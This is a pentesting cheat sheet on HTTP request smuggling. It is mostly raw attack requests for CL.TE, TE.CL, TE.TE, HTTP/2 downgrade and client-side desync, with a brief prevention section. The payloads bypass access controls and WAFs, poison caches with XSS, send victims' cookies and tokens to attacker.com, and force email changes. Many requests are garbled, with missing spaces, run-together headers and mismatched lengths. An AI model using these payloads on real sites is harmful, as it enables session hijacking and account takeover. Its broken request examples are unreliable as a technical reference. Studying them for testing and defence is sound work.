---
title: HTTP Request Smuggling
---

# HTTP Request Smuggling

HTTP Request Smuggling is a technique that exploits discrepancies in how front-end and back-end servers parse HTTP requests. When these servers disagree on where one request ends and another begins, an attacker can "smuggle" a hidden request that gets processed by the back-end server, leading to security bypass, session hijacking, cache poisoning, and other severe impacts.

---

## **Fundamentals of HTTP Request Smuggling**

### **Why Does This Happen?**

Modern web infrastructure typically chains multiple servers:

```
Browser → Front-end (CDN/Load Balancer/Reverse Proxy) → Back-end Server
```

To improve performance, the front-end maintains persistent TCP connections with the back-end and uses **HTTP pipelining**—sending multiple requests over a single connection without waiting for responses. The back-end processes these requests in FIFO (First In, First Out) order.

The problem arises because HTTP/1.1 provides two ways to specify request body length:

- **Content-Length (CL):** Specifies exact byte count of the body
- **Transfer-Encoding (TE):** Uses chunked encoding where body is sent in chunks, terminated by a zero-length chunk

When front-end and back-end servers interpret these headers differently, the boundary between requests becomes ambiguous—this is the core of request smuggling.

### **HTTP/1.0 vs HTTP/1.1 Connection Behavior**

**HTTP/1.0:**

- One TCP connection per request-response cycle
- Connection closes after each response
- No smuggling possible (no request chaining)

**HTTP/1.1:**

- Persistent connections by default
- Multiple requests over single connection
- Pipelining allows sending requests without waiting for responses
- Smuggling becomes possible when servers disagree on request boundaries

---

## **Types of Request Smuggling Attacks**

### **1. CL.TE (Content-Length vs Transfer-Encoding)**

**Scenario:** Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`

```
POST /HTTP/1.1
Host:vulnerable.com
Content-Length:13
Transfer-Encoding:chunked

0

SMUGGLED
```

**What happens:**

- Front-end sees `Content-Length: 13` and forwards 13 bytes (`0\r\n\r\nSMUGGLED`)
- Back-end sees `Transfer-Encoding: chunked`, reads until `0\r\n\r\n` (end of chunked body)
- `SMUGGLED` is left in the buffer as the start of the next request

### **2. TE.CL (Transfer-Encoding vs Content-Length)**

**Scenario:** Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`

```
POST /HTTP/1.1
Host:vulnerable.com
Content-Length:3
Transfer-Encoding:chunked

8
SMUGGLED
0
```

**What happens:**

- Front-end processes chunked encoding, forwards entire body
- Back-end sees `Content-Length: 3`, reads only 3 bytes (`8\r\n`)
- Remaining data (`SMUGGLED\r\n0\r\n\r\n`) becomes the next request

### **3. TE.TE (Transfer-Encoding Obfuscation)**

**Scenario:** Both servers support TE, but one can be tricked into ignoring it through obfuscation

```
POST /HTTP/1.1
Host:vulnerable.com
Content-Length:4
Transfer-Encoding:chunked
Transfer-Encoding:x
26
GPOST / HTTP/1.1
Content-Length:100
```

Common TE obfuscation techniques:

```
Transfer-Encoding:xchunked

Transfer-Encoding:chunked

Transfer-Encoding:chunked

Transfer-Encoding:x

Transfer-Encoding:[tab]chunked

Transfer-Encoding: chunked

X:X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### **4. CL.CL (Content-Length vs Content-Length)**

**Scenario:** Both frontend and backend rely on the `Content-Length` header, but they interpret **multiple `Content-Length` headers differently**. One server uses the first value, while the other uses the last (or rejects one and accepts the other).

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 5
Content-Length: 45

ABCDEGET /admin HTTP/1.1
Host: vulnerable.com
```

**What happens:**

- Front-end uses the **first** `Content-Length` (`5`) and forwards only `ABCDE` as the request body.
- Back-end uses the **second** `Content-Length` (`45`) and continues reading additional bytes.
- The remaining data (`GET /admin HTTP/1.1 ...`) is interpreted as the beginning of the next request, resulting in request desynchronization.

**When does this occur?**

- Duplicate `Content-Length` headers are accepted.
- Front-end and back-end follow different parsing rules.
- Legacy proxies or misconfigured HTTP intermediaries fail to reject conflicting `Content-Length` headers.

---

### **5. 0.CL (Zero Content-Length Desync)**

**Scenario:** The frontend treats the request as having **no body** (`Content-Length: 0`), while the backend continues reading additional bytes because of protocol inconsistencies or connection reuse.

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable.com
```

**What happens:**

- Front-end immediately considers the request complete because `Content-Length` is `0`.
- The connection remains open, and the extra bytes are forwarded over the same backend connection.
- The backend interprets the remaining bytes (`GET /admin ...`) as the next HTTP request, leading to request desynchronization.

**Common scenarios:**

- HTTP/1.1 connection reuse (Keep-Alive).
- HTTP/2 → HTTP/1.1 downgrade proxies.
- Reverse proxies that incorrectly forward additional bytes after a zero-length request.
- Browser-powered desynchronization attacks.

### **6. HTTP/2 Downgrade Smuggling**

When front-end speaks HTTP/2 but back-end only supports HTTP/1.1, the front-end must translate. This translation can introduce smuggling opportunities.

**H2.CL Smuggling:**

```
:method: POST:path: /:authority: vulnerable.comcontent-length: 0GET /admin HTTP/1.1Host: vulnerable.com
```

**H2.TE Smuggling:**

```
:method: POST:path: /:authority: vulnerable.comtransfer-encoding: chunked0GET /admin HTTP/1.1Host: vulnerable.com
```

### **7. Request Tunneling**

When back-end doesn't support keep-alive connections, traditional smuggling fails. However, you can still tunnel requests within a single response:

```
POST /tunnelHTTP/1.1Host:vulnerable.comContent-Length:55Connection:keep-aliveGET /adminHTTP/1.1Host:vulnerable.comX-Ignore:X
```

### **8. Client-Side Desync**

Exploits browser-to-server connection reuse. Attacker tricks victim's browser into sending a smuggled request:

```
POST /HTTP/1.1Host:vulnerable.comContent-Length:34GET /evilHTTP/1.1Host:attacker.com
```

---

## **Attack Surfaces**

### **Infrastructure Components**

- **CDNs:** Cloudflare, Akamai, Fastly, AWS CloudFront
- **Load Balancers:** HAProxy, F5, AWS ALB/ELB, nginx
- **Reverse Proxies:** nginx, Apache, Varnish, Squid
- **API Gateways:** Kong, AWS API Gateway
- **Web Application Firewalls (WAF)**

### **Vulnerable Configurations**

- Mixed HTTP versions (HTTP/2 frontend + HTTP/1.1 backend)
- Servers with different CL/TE priority handling
- Proxies that normalize or modify headers inconsistently
- Systems allowing ambiguous header formatting

### **High-Value Targets**

- Authentication endpoints
- Admin panels behind proxy-based access controls
- APIs with rate limiting at the front-end
- Applications using CDN-based caching

---

## **Exploitation and Bypassing Defenses**

### **Step 1: Detect Smuggling Vulnerability**

**Timing-Based Detection (Safe)**

CL.TE Detection:

```
POST /HTTP/1.1
Host:target.com
Transfer-Encoding:chunked
Content-Length:4

1
A
X
```

If vulnerable: back-end times out waiting for next chunk (you sent incomplete chunked body according to TE, but front-end sent complete body according to CL)

TE.CL Detection:

```
POST /HTTP/1.1
Host:target.com
Transfer-Encoding:chunked
Content-Length:6

0

X
```

If vulnerable: back-end times out (TE says body ended at `0\r\n\r\n`, but CL says there are 6 more bytes)

**Differential Response Detection**

Smuggle a request that causes different response:

```
POST /HTTP/1.1
Host:target.com
Content-Length:35
Transfer-Encoding:chunked

0

GET /404-test HTTP/1.1
X-Ignore:X
```

If next request returns 404 for a page that should exist, smuggling is confirmed.

### **Step 2: Confirm with Request Reflection**

Inject a prefix that will attach to another user's request:

```
POST /HTTP/1.1
Host:target.com
Content-Length:50
Transfer-Encoding:chunked

0
POST /search HTTP/1.1
Host:target.com
Content-Length:200

search=
```

Next legitimate user's request gets appended to `search=` parameter, and their request body (including cookies) appears in search results.

### **Step 3: Weaponize the Smuggled Request**

**Bypass Front-End Access Controls:**

```
POST /HTTP/1.1
Host:target.com
Content-Length:53
Transfer-Encoding:chunked

0

GET /admin
HTTP/1.1
Host:target.com
X-Ignore:X
```

Even if `/admin` is blocked at front-end, smuggled request bypasses directly to back-end.

**Manipulate Next User's Request:**

```
POST /HTTP/1.1
Host:target.com
Content-Length:100
Transfer-Encoding:chunked

0

GET /my-account
HTTP/1.1
Host:target.com
Cookie:session=ATTACKER_SESSION
X-Ignore:X
```

### **TE Obfuscation Techniques**

When basic TE.CL or CL.TE doesn't work, try obfuscating the `Transfer-Encoding` header:

```
Transfer-Encoding:xchunked
Transfer-Encoding:chunked
Transfer-Encoding:chunked
Transfer-Encoding:x
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunkedX:X[\n]
Transfer-Encoding: chunked
 Transfer-Encoding: chunked
```

Different servers parse these differently—one may accept, another may reject, creating the discrepancy needed for smuggling.

### **Chunked Encoding Manipulation**

```
POST /HTTP/1.1
Host:target.com
Content-Type:application/x-www-form-urlencoded
Content-Length:4
Transfer-Encoding:chunked

96

GET /admin HTTP/1.1
Host:target.com
Content-Type:application/x-www-form-urlencoded
Content-Length:15x=10
```

Chunk size `96` (hex) = 150 bytes. The smuggled GET request with its own headers is embedded within the chunk.

---

## **Advanced Attack Scenarios**

### **1. Cache Poisoning via Smuggling**

Poison CDN/proxy cache to serve malicious content to all users:

```
POST /HTTP/1.1
Host:target.com
Content-Length:130
Transfer-Encoding:chunked

0

GET /static/script.jsHTTP/1.1
Host:target.com
Content-Length:44<script>alert(document.cookie)</script>
```

If the response to smuggled request gets cached for `/static/script.js`, all subsequent visitors receive the XSS payload.

### **2. Session Hijacking / Cookie Stealing**

Capture another user's request (including cookies) by reflecting it back:

```
POST /HTTP/1.1
Host:target.com
Content-Length:70
Transfer-Encoding:chunked

0

POST /logHTTP/1.1
Host:attacker.com
Content-Length:500

data=
```

Next user's request appends to `data=`, sending their entire request (with session cookies) to attacker's server.

**Real-world example (Slack):**

```
POST /HTTP/1.1
Host:slackb.com
Content-Length:200
Transfer-Encoding:chunked

0

POST /api/logs HTTP/1.1
Host:slackb.com
Content-Type:application/x-www-form-urlencoded
Content-Length:1000

log=
```

Captured session cookies of other Slack users, leading to mass account takeover. [hackerone.com](https://hackerone.com/reports/737140)

### **3. Bypassing Security Controls**

**WAF Bypass:** Smuggled request bypasses WAF inspection since it's hidden within what WAF sees as legitimate request body.

```
POST /harmless HTTP/1.1
Host:target.com
Content-Length:100
Transfer-Encoding:chunked

0

GET /admin?cmd=whoami HTTP/1.1
Host:target.com
X-Ignore:X
```

WAF scans `/harmless`, smuggled request to `/admin?cmd=whoami` passes through.

**IP-Based Access Control Bypass:**

```
POST / HTTP/1.1
Host:target.com
Content-Length:60Transfer-Encoding:chunked
0
GET /internal-api HTTP/1.1
Host:internal.target.com
```

### **4. On-Site Redirect to Open Redirect Escalation**

Combine smuggling with a redirect endpoint:

```
POST /HTTP/1.1
Host:target.com
Content-Length:116
Transfer-Encoding:chunked

0

GET /redirect?url=[attacker.com](https://attacker.com/)HTTP/1.1
Host:target.com
Cookie:session=VICTIM_SESSION
X-Ignore:X
```

Next user's response is a redirect to attacker's site, potentially with their cookies/tokens in the Referer header.

### **5. Web Cache Deception via Smuggling**

```
POST /HTTP/1.1
Host:target.com
Content-Length:80
Transfer-Encoding:chunked

0

GET /account/settings HTTP/1.1
Host:target.com
X-Ignore:X
```

If next request is for a static resource that gets cached (e.g., `/styles.css`), and response contains victim's account page, attacker can retrieve cached sensitive data.

### **6. XSS via Request Smuggling**

Inject XSS into a reflected parameter that gets processed by the back-end:

```
POST /HTTP/1.1
Host:target.com
Content-Length:150
Transfer-Encoding:chunked

0

GET /search?q=<script>document.location='[attacker.com](https://attacker.com/?c=)'+document.cookie</script>HTTP/1.1
Host:target.com
```

### **7. CSRF via Smuggling**

Force authenticated actions by hijacking another user's session context:

```
POST /HTTP/1.1
Host:target.com
Content-Length:120
Transfer-Encoding:chunked

0

POST /account/change-email HTTP/1.1
Host:target.com
Content-Type:application/x-www-form-urlencoded
Content-Length:30

email=attacker@evil.com
```

Next authenticated user's request completes this email change with their session.

### **8. Token/Credential Theft (Zomato Example)**

```
POST /HTTP/1.1
Host:api.zomato.com
Content-Length:150
Transfer-Encoding:chunked

0

POST /api/log HTTP/1.1
Host:attacker.com
Content-Type:application/x-www-form-urlencoded
Content-Length:1500

stolen=
```

Captured X-Access-Tokens from other Zomato API users. [hackerone.com](https://hackerone.com/reports/771666)

---

## **HTTP/2 Specific Scenarios**

### **H2.CL (HTTP/2 to Content-Length)**

```
:method POST
:path /
:authority vulnerable.com
content-length 0
SMUGGLED
```

Front-end (HTTP/2) ignores body since pseudo-headers indicate no body expected, but forwards `content-length: 0` to back-end. Back-end (HTTP/1.1) sees `Content-Length: 0` but receives body bytes, which become next request.

### **H2.TE (HTTP/2 to Transfer-Encoding)**

HTTP/2 doesn't use Transfer-Encoding, but during downgrade:

```
:method POST
:path /
:authority vulnerable.com
transfer-encoding 
chunked
0
GET /admin HTTP/1.1
Host: vulnerable.com
```

### **Header Injection via HTTP/2 CRLF**

HTTP/2 binary framing can include characters illegal in HTTP/1.1:

```
:method GET
:path /
:authority vulnerable.com
foo bar\r\nTransfer-Encoding: chunked
```

During translation to HTTP/1.1, this becomes header injection.

### **Request Splitting via HTTP/2 Pseudo-Headers**

```
:method GET
:path / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin
:authority vulnerable.com
```

---

## **Detection Techniques**

### **Manual Detection**

**1. Timing-Based Probing**

Send payloads that should cause timeout if vulnerable:

CL.TE probe:

```
POST /HTTP/1.1
Host:target.com
Content-Type:application/x-www-form-urlencoded
Content-Length:4
Transfer-Encoding:chunked

1
A
X
```

Delay = vulnerable to CL.TE

TE.CL probe:

```
POST /HTTP/1.1
Host:target.com
Content-Type:application/x-www-form-urlencoded
Content-Length:6
Transfer-Encoding:chunked

0

X
```

Delay = vulnerable to TE.CL

**2. Differential Response Testing**

```
POST /HTTP/1.1
Host:target.com
Content-Length:49Transfer-Encoding:chunked
0
GET /hopefully-404HTTP/1.1
Foo:bar
```

Send normal request immediately after. If you get 404 for a valid page, smuggling confirmed.

**3. Response Queue Poisoning Check**

Send smuggled request, then send multiple normal requests. If responses are misaligned (getting responses meant for other requests), confirmed.

**4. Header Obfuscation Fuzzing**

Try various TE header mutations to find one that causes discrepancy between servers.

### **Automated Detection**

| **Tool** | **Description** | **Usage** |
| --- | --- | --- |
| **smuggler** | Detects CL.TE, TE.CL, TE.TE with various obfuscations | `python3 smuggler.py -u [target.com](https://target.com)` |
| **http-request-smuggler** (Burp Extension) | Automated detection within Burp Suite | Extensions → BApp Store → Install |
| **h2csmuggler** | HTTP/2 cleartext smuggling detection | `python3 h2csmuggler.py -x [target.com](https://target.com)` |
| **smuggler.py** | Multiple mutation techniques | `python3 smuggler.py -u [target.com](https://target.com) -m all` |
| **Burp Turbo Intruder** | Custom timing-based detection | Load desync-probe script |

**Smuggler Tool Usage:**

```bash
# Basic scan
python3smuggler.py-u [target.com](https://target.com)
# With all mutations
python3smuggler.py-u [target.com](https://target.com) -m all
# Specify config
python3smuggler.py-u [target.com](https://target.com) -c default
```

**Burp Suite Workflow:**

1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle Probe
3. Review results in Dashboard/Logger

---

## **Real-World Bug Bounty Reports**

| **Target** | **Vulnerability** | **Impact** | **Report** |
| --- | --- | --- | --- |
| **Slack** | CL.TE | Mass session hijacking | [hackerone.com](https://hackerone.com/reports/737140) |
| **Zomato** | CL.TE | X-Access-Token theft in bulk | [hackerone.com](https://hackerone.com/reports/771666) |
| **PayPal** | TE.CL | Cache poisoning | [hackerone.com](https://hackerone.com/reports/488147) |
| **New Relic** | CL.TE | Authentication bypass | [hackerone.com](https://hackerone.com/reports/498052) |
| **U.S. DoD** | HTTP/2 | Internal admin access | [hackerone.com](https://hackerone.com/reports/867952) |

---

## **Impact**

- **Authentication Bypass:** Access admin panels, internal APIs
- **Session Hijacking:** Capture other users' cookies and tokens
- **Cache Poisoning:** Serve malicious content to all users
- **WAF Bypass:** Evade security controls entirely
- **XSS Escalation:** Inject scripts via request reflection
- **CSRF:** Execute actions as other authenticated users
- **Data Exfiltration:** Capture sensitive information from other requests
- **Account Takeover:** Combined with above techniques
- **Internal Network Access:** Reach back-end services normally unreachable

---

## **Prevention Techniques**

- Use **HTTP/2 end-to-end** across the entire stack (frontend to backend) to eliminate CL/TE ambiguities and avoid HTTP/1.1 downgrades.
- **Reject requests** containing both Content-Length and Transfer-Encoding headers (or malformed/duplicate ones) to block CL.TE, TE.CL, and CL.CL variants.
- **Normalize requests** at the edge/proxy: strip suspicious whitespace, disallow obsolete line folding, canonicalize headers, and reject ambiguous/malformed requests before forwarding.
- **Disable connection reuse** (keep-alive) between frontend and backend where possible to prevent desynced requests from persisting across connections.
- **Ensure consistent parsing** across all servers in the chain — use the same software/version for frontend and backend when feasible to avoid differential interpretation.
- **Prioritize Transfer-Encoding** over Content-Length (or strictly disallow both) in line with RFC 7230 to mitigate CL.TE/TE.CL mismatches.

---

## **Tools**

| **Tool** | **Purpose** | **Link** |
| --- | --- | --- |
| **smuggler** | CL.TE/TE.CL detection | [github.com](https://github.com/defparam/smuggler) |
| **http-request-smuggler** | Burp Suite extension | Burp BApp Store |
| **h2csmuggler** | HTTP/2 cleartext smuggling | [github.com](https://github.com/BishopFox/h2csmuggler) |
| **HTTP Request Smuggler** | Burp extension by PortSwigger | Burp BApp Store |
| **Turbo Intruder** | Timing-based detection | Burp BApp Store |
| **smuggler.py** | Multiple techniques | [github.com](https://github.com/defparam/smuggler) |

---

## **Good to Read**

- [portswigger.net](https://portswigger.net/research/http-desync-attacks-reborn)
- [portswigger.net](https://portswigger.net/web-security/request-smuggling)
- [portswigger.net](https://portswigger.net/research/http2)
- [portswigger.net](https://portswigger.net/research/browser-powered-desync-attacks)
- [hackerone.com](https://hackerone.com/reports/737140)
- [hackerone.com](https://hackerone.com/reports/771666)

---

## **References**

- [portswigger.net](https://portswigger.net/web-security/request-smuggling)
- [portswigger.net](https://portswigger.net/research/http2)
- [hackerone.com](https://hackerone.com/reports/737140)
- [hackerone.com](https://hackerone.com/reports/771666)
- [hackerone.com](https://hackerone.com/reports/867952)
- [hackerone.com](https://hackerone.com/reports/488147)
- [hackerone.com](https://hackerone.com/reports/498052)
- [hacktricks.wiki](https://hacktricks.wiki/en/pentesting-web/http-request-smuggling)
- [medium.com](https://medium.com/@jayeshkunwal/http-request-smuggling-from-basics-to-bounty-4a799f2e18c2)
- [notes.incendium.rocks](https://notes.incendium.rocks/pentesting-notes/web/request-smuggling)
- [cobalt.io](https://www.cobalt.io/vulnerability-wiki/v5-validation-sanitization/http-request-smuggling)